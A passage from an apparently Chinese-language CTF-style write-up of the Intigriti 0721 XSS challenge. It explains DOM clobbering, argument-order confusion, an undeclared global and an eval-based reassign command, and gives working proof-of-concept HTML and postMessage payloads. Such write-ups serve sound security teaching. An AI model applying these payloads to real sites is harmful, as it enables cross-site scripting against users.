punctuation\">{</span><br>        data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&amp;lt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    prefix_tag<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> prefix<span class=\"token punctuation\">;</span><br>    text_tag<span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span><br><br>    line<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>prefix_tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    line<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>text_tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#console'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span> </code></pre>\n<p>如果 safe 是 true 的話，那 data 就不會被 escape，就可以插入任意的 HTML，達成 XSS。</p>\n<p>而這邊值得注意的是函式的參數那一段：<code>let log = (prefix, data, type='info', safe=false)</code>，這點值得特別解釋一下。</p>\n<p>在有些程式語言裡面，支援這種參數的命名，在呼叫 function 的時候可以用名稱來傳入參數，例如說：<code>log(prefix='a', safe=true)</code>，就傳入對應到的參數。</p>\n<p>但是在 JS 裡面並沒有這種東西，參數的對應完全是靠「順序」來決定的。舉例來說，<code>log(&quot;[logv]: &quot;, window[m.message], safe=false, type='info');</code> 對應到的參數其實是：</p>\n<ol>\n<li>prefix: <code>&quot;[logv]: &quot;</code></li>\n<li>data: <code>window[m.message]</code></li>\n<li>type: <code>false</code></li>\n<li>safe: <code>'info'</code></li>\n</ol>\n<p>是靠順序而不是靠名稱，這也是許多新手會被搞混的地方。</p>\n<p>總之呢，就讓我們從 <code>log</code> 這個函式開始往回找吧，要執行到這一段，必須要 post message 到這個 window，然後符合一些條件。</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E6%88%90%E5%8A%9F-post-message\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E6%88%90%E5%8A%9F-post-message\">#</a> 第一關：成功 post message</h2>\n<p>這個 console.php 的頁面有一些條件限制，如果沒有符合這些條件就沒辦法執行到 log function 去。</p>\n<p>首先這個頁面必須被 embed 在 iframe 裡面：</p>\n<pre class=\"language-js\"><code class=\"language-js\">name <span class=\"token operator\">=</span> <span class=\"token string\">'Console'</span><br>document<span class=\"token punctuation\">.</span>title <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span><br><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>top <span class=\"token operator\">===</span> window<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span>parentNode<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// hide code if not on iframe</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>再來還有這些檢查要通過：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>top<span class=\"token punctuation\">.</span><span class=\"token constant\">DEV</span><span class=\"token punctuation\">)</span><br>        <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Production build!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <br>    <span class=\"token keyword\">let</span> <span class=\"token function-variable function\">checkCredentials</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">username<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">let</span> users <span class=\"token operator\">=</span> top<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">let</span> access <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>users<span class=\"token punctuation\">.</span>admin<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>moderator<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>manager<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>users <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>x <span class=\"token keyword\">of</span> access<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username <span class=\"token operator\">&amp;&amp;</span> x<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">)</span><br>                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">let</span> _onmessage <span class=\"token operator\">=</span> onmessage<span class=\"token punctuation\">;</span><br>    <span class=\"token function-variable function\">onmessage</span> <span class=\"token operator\">=</span> <span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m<span class=\"token punctuation\">.</span>credentials <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">checkCredentials</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">.</span>credentials<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// do nothing if unauthorized</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token comment\">// ...</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// hide this script on production</span><br>    document<span class=\"token punctuation\">.</span>currentScript<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p><code>top.DEV</code> 要是 truthy，然後傳進去的 credentials 要符合 <code>top.store.users.admin.username</code> 還有 <code>top.store.users.admin.password</code></p>\n<p>這樣我應該自己寫一個頁面，然後設置一下這些全域變數就好了？</p>\n<p>沒辦法，因為有 Same Origin Policy 的存在，你只能存取同源頁面下的 window 內容，所以如果是自己寫一個頁面然後把 console.php embed 在裡面的話，在存取 <code>top.DEV</code> 時就會出錯。</p>\n<p>所以我們需要有一個同源的頁面可以讓我們設置一些東西。而這個頁面，顯然就是可以讓我們插入一些 HTML 的 htmledit.php 了。</p>\n<h2 id=\"dom-clobbering\"><a class=\"direct-link\" href=\"#dom-clobbering\">#</a> DOM clobbering</h2>\n<p>該怎麼在不能執行 JS 的情況下設置全域變數呢？沒錯，就是 DOM clobbering。</p>\n<p>舉例來說，如果你有個 <code>&lt;div id=&quot;a&quot;&gt;&lt;/div&gt;</code>，在 JS 裡面你就可以用 <code>window.a</code> 或是 <code>a</code> 去存取到這個 div 的 DOM。</p>\n<p>如果你對 DOM clobbering 不熟的話可以參考我之前寫過的<a href=\"https://blog.huli.tw/2021/01/23/dom-clobbering/\">淺談 DOM Clobbering 的原理及應用</a>，或是這一篇也寫得很好：<a href=\"https://blog.zeddyu.info/2020/03/04/Dom-Clobbering/\">使用 Dom Clobbering 扩展 XSS</a></p>\n<p>如果要達成多層的變數設置，就要利用到 <code>iframe</code> 搭配 <code>srcdoc</code>：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>DEV<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>store<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">srcdoc</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span><br>    &lt;a id=<span class=\"token punctuation\">\"</span>users<span class=\"token punctuation\">\"</span>>&lt;/a><br>    &lt;a id=<span class=\"token punctuation\">\"</span>users<span class=\"token punctuation\">\"</span> name=<span class=\"token punctuation\">\"</span>admin<span class=\"token punctuation\">\"</span> href=<span class=\"token punctuation\">\"</span>ftp://a:a@a<span class=\"token punctuation\">\"</span>>&lt;/a><br>    <span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>iframeConsole<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://challenge-0721.intigriti.io/console.php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這邊還有利用到一個特性是 a 元素的 username 屬性會是 href 屬性裡 URL 的 username。</p>\n<p>這樣設置的話，<code>top.DEV</code> 就會是 <code>a id=&quot;DEV&quot;&gt;&lt;/a&gt;</code> 這個 DOM，而 <code>store.users</code> 就會是 HTMLCollection，<code>store.users.admin</code> 是那個 a，<code>store.users.admin.username</code> 則會是 href 裡面的 username，也就是 <code>a</code>，而密碼也是一樣的。</p>\n<p>綜合以上所述，我可以自己寫一個 HTML 然後用 <code>window.open</code> 去開啟 htmledit.php 然後把上面的內容帶進去：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>XSS POC<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>  <br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>    <span class=\"token keyword\">const</span> htmlUrl <span class=\"token operator\">=</span> <span class=\"token string\">'https://challenge-0721.intigriti.io/htmledit.php?code='</span><br>    <span class=\"token keyword\">const</span> payload <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>      &lt;a id=\"DEV\">&lt;/a><br>      &lt;iframe name=\"store\" srcdoc='<br>        &lt;a id=\"users\">&lt;/a><br>        &lt;a id=\"users\" name=\"admin\" href=\"ftp://a:a@a\">&lt;/a><br>      '>&lt;/iframe><br>      &lt;iframe name=\"iframeConsole\" src=\"https://challenge-0721.intigriti.io/console.php\">&lt;/iframe><br>    </span><span class=\"token template-punctuation string\">`</span></span><br><br>    <span class=\"token keyword\">var</span> win <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>htmlUrl <span class=\"token operator\">+</span> <span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><br><br>    <span class=\"token comment\">// wait unitl window loaded</span><br>    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>      console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'go'</span><span class=\"token punctuation\">)</span><br>      <span class=\"token keyword\">const</span> credentials <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>        username<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><br>        password<span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><br>      <span class=\"token punctuation\">}</span><br>      win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>        cmd<span class=\"token operator\">:</span> <span class=\"token string\">'test'</span><span class=\"token punctuation\">,</span><br>        credentials<br>      <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">)</span><br><br>  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>如此一來，我就可以用 postMessage 送訊息進去了。</p>\n<p>雖然花了一番功夫，但這才只是開始而已。</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E8%AE%93-safe-%E8%AE%8A%E6%88%90-true\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E8%AE%93-safe-%E8%AE%8A%E6%88%90-true\">#</a> 第二關：讓 safe 變成 true</h2>\n<p>safe 要是 true，這樣呼叫 log 的時候才不會把 <code>&lt;</code> escape，要讓 safe 是 true 的話，要找到有傳入四個參數的呼叫，因為第四個會是 safe 的值：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">case</span> <span class=\"token string\">\"logv\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// display variable's value by its name</span><br>    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[logv]: \"</span><span class=\"token punctuation\">,</span> window<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span><br><span class=\"token keyword\">case</span> <span class=\"token string\">\"compare\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// compare variable's value to a given one</span><br>    <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[compare]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>window<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>variable<span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> safe<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'info'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <br>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p><code>log(&quot;[logv]: &quot;, window[m.message], safe=false, type='info')</code> 這個我在找的 function call，而這之中第二個參數會是 <code>window[m.message]</code>，也就是說可以把任一全域變數當作 data 傳進去，可是要傳什麼呢？</p>\n<h2 id=\"%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E6%89%BE%E5%88%B0%E5%8F%AF%E4%BB%A5%E5%82%B3%E5%85%A5%E7%9A%84%E8%AE%8A%E6%95%B8\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E6%89%BE%E5%88%B0%E5%8F%AF%E4%BB%A5%E5%82%B3%E5%85%A5%E7%9A%84%E8%AE%8A%E6%95%B8\">#</a> 第三關：找到可以傳入的變數</h2>\n<p>我在這邊卡得滿久的，因為我想不太到這邊可以傳什麼。以前有一招是可以傳 name，但是這個網頁已經自己設定 name 了所以沒辦法。另一招是用 URL 去傳就可以把東西放在 location 上面，但 <code>log</code> 裡面會檢查 <code>data</code> 是不是字串，不是的話要先經過 <code>JSON.stringify</code>，會把內容encode。</p>\n<p>卡很久的我只好不斷重複看著程式碼，看能不能找出什麼新東西，結果還真的找到了。下面這段 code 有一個新手常見問題，你有看出來嗎？</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">checkCredentials</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">username<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">let</span> users <span class=\"token operator\">=</span> top<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">let</span> access <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>users<span class=\"token punctuation\">.</span>admin<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>moderator<span class=\"token punctuation\">,</span> users<span class=\"token punctuation\">.</span>manager<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>users <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>x <span class=\"token keyword\">of</span> access<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> username <span class=\"token operator\">&amp;&amp;</span> x<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">)</span><br>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這個問題就出在 <code>for (x of access) {</code>，x 忘了宣告，所以預設就會變成全域變數。在這邊的話，<code>x</code> 會是 <code>top.store.users.admin</code>，也就是我們自己設置的那個 <code>&lt;a&gt;</code>。</p>\n<h2 id=\"%E7%AC%AC%E5%9B%9B%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E%E5%9E%8B%E6%85%8B%E6%AA%A2%E6%9F%A5\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E5%9B%9B%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E%E5%9E%8B%E6%85%8B%E6%AA%A2%E6%9F%A5\">#</a> 第四關：繞過型態檢查</h2>\n<p>既然我們有了這個 x，就可以把它用 logv 這個 command 傳入 log function，然後因為 safe 會是 true，所以就可以直接把 x 的內容用 innerHTML 顯示出來。</p>\n<p>如果你把一個 a 元素變成字串，會得到 a.href 的內容，所以我們可以把我們的 payload 放在 href 裡面。</p>\n<p>但是，<code>log</code> 裡面會檢查 data 的型態，而 <code>a</code> 不是字串所以過不了檢查，這該怎麼辦呢？</p>\n<p>這時候我重新看了一遍程式碼，發現了這個指令：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">case</span> <span class=\"token string\">\"reassign\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// change variable's value</span><br>    <span class=\"token keyword\">let</span> o <span class=\"token operator\">=</span> m<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">let</span> RegExp <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^[s-zA-Z-+0-9]+$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>RegExp<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>o<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid input given!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>        <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Value of \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>a<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\" was changed to \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>o<span class=\"token punctuation\">.</span>b<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">\"</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'warn'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[reassign]: \"</span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Error changing value (</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>err<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">)</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">=</span><span class=\"token string\">'err'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>我可以這樣做：</p>\n<pre class=\"language-js\"><code class=\"language-js\">win<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">postMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><br>    cmd<span class=\"token operator\">:</span> <span class=\"token string\">'reassign'</span><span class=\"token punctuation\">,</span><br>    message<span class=\"token operator\">:</span><span class=\"token punctuation\">{</span><br>      a<span class=\"token operator\">:</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">,</span><br>      b<span class=\"token operator\">:</span> <span class=\"token string\">'x+1'</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>    credentials<br><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">)</span></code></pre>\n<p>這就等於是 <code>Z=x+1</code>，然後 <code>x+1</code> 的時候會因為自動轉型的關係變成字串，這樣一來 Z 就會是一個含有我們 payload 的字串了。</p>\n<h2 id=\"%E7%AC%AC%E4%BA%94%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-encode\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%94%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E-encode\">#</a> 第五關：繞過 encode</h2>\n<p>雖然我們現在可以傳字串進去了，但還有一件事情要搞定，那就是因為 href 裡面的東西是 URL 所以會被 encode，例如說 <code>&lt;</code> 會變成 <code>%3C</code>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><br>a<span class=\"token punctuation\">.</span><span class=\"token 